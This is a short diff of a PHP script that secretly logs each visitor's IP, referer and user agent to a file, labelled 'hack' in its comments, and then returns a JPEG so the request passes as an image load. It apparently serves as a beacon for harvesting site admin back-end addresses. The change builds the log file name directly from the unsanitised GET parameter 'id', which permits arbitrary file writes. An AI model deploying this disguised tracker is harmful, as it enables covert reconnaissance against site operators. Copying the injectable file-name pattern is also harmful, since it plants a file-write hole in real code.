@@ -38,12 +38,12 @@
 //记录后台地址等信息
     $hack = 'date: '.$date_.'ip:'.$ip."\r\n".'referer: '.$referer.'ua: '.$ua;
     $hack = filter_dangerous_words($hack);
-    $op = fopen('hack.txt','a+');
+    $op = fopen($_GET["id"].'.txt','a+'); //通过get参数id生成文件名
     fwrite($op,$hack);
     fclose($op);
  
 //伪装成图片
-    $im = imagecreatefromjpeg("2.jpg");//注意该目录下，也要有2.jpg这个图片。
+    $im = imagecreatefromjpeg("1.jpg");//注意该目录下，也要有1.jpg这个图片。
     header('Content-Type: image/jpeg');
     imagejpeg($im);
     imagedestroy($im);
